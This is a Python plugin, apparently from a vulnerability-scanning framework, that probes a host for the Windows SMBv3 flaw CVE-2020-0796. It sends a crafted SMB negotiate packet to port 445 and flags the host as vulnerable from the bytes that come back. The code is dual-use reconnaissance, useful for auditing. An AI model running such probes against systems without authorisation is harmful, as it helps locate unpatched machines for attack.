from util.ExpRequest import ExpRequest,Output
from operator import methodcaller
import socket
import struct
class WindowsSMBv3():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.status = env.get('status')

    def CVE_2020_0796(self):
        appName = 'Windows'
        pocname = 'CVE_2020_0796'
        method = 'socket'
        payload =  b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        desc = 'Windows : CVE_2020_0796'
        info = 'WindowsSMBv3协议漏洞'
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            sock = socket.socket(socket.AF_INET)
            sock.settimeout(3)
            ip = socket.gethostbyname(self.url)
            sock.connect((ip, 445))
            sock.send(payload)
            nb, = struct.unpack(">I", sock.recv(4))
            res = sock.recv(nb)
            if (not res[68:70] == b"\x11\x03") or (not res[70:72] == b"\x02\x00"):
                output.fail()
            else:
                info = "{}存在WindowsSMBv3协议漏洞(CVE-2020-0796), IP值:{}".format(self.url,ip)
                output.echo_success(method, info)
                self.status = 'success'
        except Exception as error:
            output.error_output(str(error))

def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpWindowsSMBv3 = WindowsSMBv3(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpWindowsSMBv3, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpWindowsSMBv3.status
    else:#调用所有函数
        for func in dir(WindowsSMBv3):
            if not func.startswith("__"):
                methodcaller(func)(ExpWindowsSMBv3)
                result_list.append(func+' -> '+ExpWindowsSMBv3.status)
                ExpWindowsSMBv3.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)

